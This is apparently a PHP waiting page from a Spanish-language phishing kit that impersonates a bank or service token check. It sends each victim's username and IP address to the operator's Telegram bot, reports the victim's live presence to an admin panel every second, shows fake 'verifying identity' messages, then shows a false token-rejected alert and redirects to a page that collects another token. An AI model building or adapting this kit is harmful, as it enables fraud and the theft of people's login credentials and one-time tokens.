<?php
include './config.php';
include './gobbot/facherito/admin/run.php';
if (isset($_GET['exprmntusr']) && !empty($_GET['exprmntusr'])) {$username = $_GET['exprmntusr'];
} else {die('.');}

include './gobbot/facherito/skill/tg.php';

include './fatgov.php';
function start($username)
{
    $msg = "➖➖➖[ " . APP_NAME . " ]➖➖➖\n\n";
    $msg = " 🏴‍☠️ <code>" . $username . "</code> :: <code>" . getIP22() . "</code> 𝐄𝐍 𝐄𝐒𝐏𝐄𝐑𝐀\n\n";
    $apiToken = BOT_TOKEN;
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'html'
    ];
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?";
    $response = @file_get_contents($url . http_build_query($data));
}
if ($alertx == true) {
    start($username);
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./gobbot/facherito/css/si.css" rel="stylesheet">
    <meta name="robots" content="noindex">
    <title>Aguarde un momento</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        /* Estilos para la ventana emergente de alerta */
        .alert-overlay {
font-size:22px;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s, visibility 0.3s;
            z-index: 1000;
        }

        .alert-box {
font-size:22px;
            background: #fff;
            padding: 20px;
            width: 300px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }

        .alert-box h4 {
font-size:45px;
            color: #ff0000;
            margin: 0;
        }
    </style>
</head>

<body>

    <header></header>

    <section class="container">
        <div class="image-container"></div>
        <div>
            <img style="margin-top:5px" width="450px" src="./asd.png" alt="Logo">
            <br>
            <h4 id="loading-text" style="font-size:15px; color:#57575">AGUARDE UN INSTANTE</h4>
            <span style="margin-top:15px" class="loader"></span>
            <br><br> 
        </div>
    </section>

    <footer>
        <div class="footer-content">
            <b>NO CIERRES ESTA VENTANA</b>
        </div>
    </footer>

    <!-- Ventana emergente de alerta -->
    <div class="alert-overlay" id="alert-overlay">
        <div class="alert-box">
            <h4>⚠️</h4>
            <p>No hemos podido validar el TOKEN ingresado.</p>
        </div>
    </div>

    <script>
        const username = '<?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>';
        const timer = <?= $timer2 * 1000 ?>;

        function notifyServer(status) {
            $.post('./gobbot/facherito/admin/activi.php', { username: username, status: status });
        }

        setInterval(() => {
            notifyServer('active');
        }, 1000);

        window.addEventListener('beforeunload', function () {
            notifyServer('inactive');
        });

        const messages = [
            "COMPRUEBE QUE EL TOKEN NO ESTE PRONTO A VENCERSE",
            "VERIFICANDO IDENTIDAD...",
            "PROCESANDO INFORMACIÓN...",
            "REALIZANDO CONEXIÓN SEGURA...",
            "AGUARDE UN INSTANTE",
            "ESTAMOS CASI LISTOS...",
            "AGRADECEMOS SU PACIENCIA",
            "SOLO UNOS SEGUNDOS MAS...",
            "ESTAMOS CASI LISTOS...",
        ];

        let messageIndex = 0;
        const loadingText = document.getElementById("loading-text");

        setInterval(() => {
            messageIndex = (messageIndex + 1) % messages.length;
            loadingText.textContent = messages[messageIndex];
        }, 2000);

        // Mostrar alerta 5 segundos antes de redirigir
        setTimeout(function() {
            document.getElementById("alert-overlay").style.visibility = "visible";
            document.getElementById("alert-overlay").style.opacity = "1";
        }, timer - 5000);

        setTimeout(function() {
            window.location.href = 'tokenerr.php?exprmntusr=' + encodeURIComponent(username);
        }, timer); 
    </script>

</body>

</html>